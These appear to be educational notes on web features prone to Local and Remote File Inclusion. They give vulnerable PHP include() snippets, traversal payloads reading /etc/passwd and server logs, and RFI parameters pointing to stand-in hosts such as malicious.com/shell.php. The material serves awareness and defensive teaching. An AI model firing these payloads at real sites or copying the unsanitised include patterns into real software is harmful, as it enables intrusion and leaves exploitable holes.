# Functionalities Prone to LFI and RFI
## Dynamic Page Loading

- Applications that load content dynamically based on user input, such as include() or require() in PHP.
Example:
php
Copy code
<?php
$page = $_GET['page'];
include($page); // Includes user-specified file
?>
Vulnerable URL:
arduino
Copy code
http://example.com/index.php?page=home.php
Theme or Template Loaders

- Websites allowing users to select themes or templates by specifying a file path.
Example:
sql
Copy code
GET /site.php?theme=default
If improperly sanitized, attackers could provide paths to local files (../../config.php) or external URLs (http://malicious.com/shell.php).
Language or Localization Files

- Applications loading different language files based on user preferences.
Example:
php
Copy code
$lang = $_GET['lang'];
include("languages/" . $lang . ".php");
Vulnerable URL:
bash
Copy code
http://example.com/index.php?lang=../../../../etc/passwd
File Management Features

- File upload, download, or display functionalities, where the server dynamically constructs file paths.
Example:
php
Copy code
$file = $_GET['file'];
include("uploads/" . $file);
Vulnerable URL:
bash
Copy code
http://example.com/file.php?file=../../../../../var/log/apache2/access.log
Log Viewing Utilities

- Debugging tools that allow users or admins to view logs dynamically.
If attackers can specify which file to view, they can exploit LFI.
Example:
bash
Copy code
GET /logs.php?file=../../../../etc/passwd
Backup or Configuration Loaders

- Applications that allow dynamic loading of backups or configuration files.
Example:
php
Copy code
$config = $_GET['config'];
include("configs/" . $config);
Custom Plugins or Extensions

- Systems that dynamically load plugins or extensions, often used in CMS platforms like WordPress, Joomla, or Drupal.
Example:
bash
Copy code
GET /load_plugin.php?plugin=../../../../plugin/malicious.php



# Local File Inclusion (LFI):
Dynamic Template Inclusion:

Scenario: A PHP application dynamically includes page templates based on a URL parameter, e.g., https://example.com/?page=home.
Misconfiguration: The application directly includes the parameter value without validation, enabling inclusion of arbitrary files from the server, e.g., page=../../etc/passwd.
Language Selection:

Scenario: A web app includes localization files based on user-selected languages, e.g., https://example.com/?lang=en.
Misconfiguration: Lack of input validation allows attackers to load sensitive files by injecting directory traversal payloads, e.g., lang=../../../../var/log/auth.log.
Profile Picture Inclusion:

Scenario: The app allows users to upload profile pictures and later includes them for rendering on user profiles.
Misconfiguration: An attacker uploads a malicious file and references it via an LFI vulnerability, e.g., https://example.com/profile?pic=../../uploads/malicious.php.


# Remote File Inclusion (RFI):
Dynamic Script Inclusion:

Scenario: A PHP application includes scripts dynamically based on user input, e.g., https://example.com/?module=home.
Misconfiguration: Input is not sanitized, allowing attackers to include external scripts, e.g., module=http://malicious.com/shell.php.
Theme Selection:

Scenario: A CMS allows users to customize themes by loading styles or templates via a URL parameter, e.g., https://example.com/?theme=default.
Misconfiguration: The parameter accepts external URLs, allowing attackers to include malicious remote files, e.g., theme=http://attacker.com/malicious-theme.php.
Configuration Import:

Scenario: An application imports configuration files from a URL provided by the user, e.g., https://example.com/import-config?url=config.xml.
Misconfiguration: The system allows importing remote files without verification, enabling attackers to host malicious configurations or scripts.